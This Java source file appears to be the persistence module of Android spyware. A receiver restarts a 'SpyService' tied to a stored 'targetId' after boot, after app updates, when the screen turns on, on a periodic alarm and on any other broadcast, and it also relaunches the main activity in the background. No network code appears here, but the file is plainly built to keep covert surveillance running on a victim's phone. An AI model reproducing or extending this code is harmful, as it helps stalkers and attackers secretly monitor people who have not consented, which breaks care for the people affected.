package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import android.content.SharedPreferences;

public class RestarterReceiver extends BroadcastReceiver {
    private static final String TAG = "RestarterReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "Sinyal diterima: " + action);

        // Handle BOOT_COMPLETED - Restart service after device reboot
        if (Intent.ACTION_BOOT_COMPLETED.equals(action)) {
            Log.d(TAG, "Device boot completed - restarting spy service");
            startSpyService(context);
        }
        
        // Handle package replaced (app update)
        else if (Intent.ACTION_MY_PACKAGE_REPLACED.equals(action)) {
            Log.d(TAG, "Package replaced - restarting spy service");
            startSpyService(context);
        }
        
        // Handle screen on (optional - untuk wake lock)
        else if (Intent.ACTION_SCREEN_ON.equals(action)) {
            Log.d(TAG, "Screen on - checking service");
            startSpyService(context);
        }
        
        // Handle from alarm manager (periodic check)
        else if ("com.nullx.pp.ALARM_CHECK".equals(action)) {
            Log.d(TAG, "Alarm check - ensuring service running");
            startSpyService(context);
        }
        
        // Default: start service anyway
        else {
            startSpyService(context);
        }
    }

    private void startSpyService(Context context) {
        try {
            // Get saved target ID to verify if device is registered
            SharedPreferences prefs = context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            String targetId = prefs.getString("targetId", "");
            
            if (targetId.isEmpty()) {
                Log.d(TAG, "No target ID found, service not started");
                return;
            }
            
            Log.d(TAG, "Starting SpyService for target: " + targetId);
            
            // Intent untuk SpyService
            Intent serviceIntent = new Intent(context, SpyService.class);
            serviceIntent.putExtra("targetId", targetId);
            serviceIntent.setAction("START_SPY_SERVICE");
            
            // Start service sesuai version Android
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // Android 8.0+ memerlukan startForegroundService
                context.startForegroundService(serviceIntent);
                Log.d(TAG, "Started foreground service (Android 8.0+)");
            } else {
                context.startService(serviceIntent);
                Log.d(TAG, "Started normal service");
            }
            
            // Also start MainActivity in background (optional)
            Intent mainIntent = new Intent(context, MainActivity.class);
            mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(mainIntent);
            Log.d(TAG, "MainActivity started in background");
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to start service: " + e.getMessage());
        }
    }
}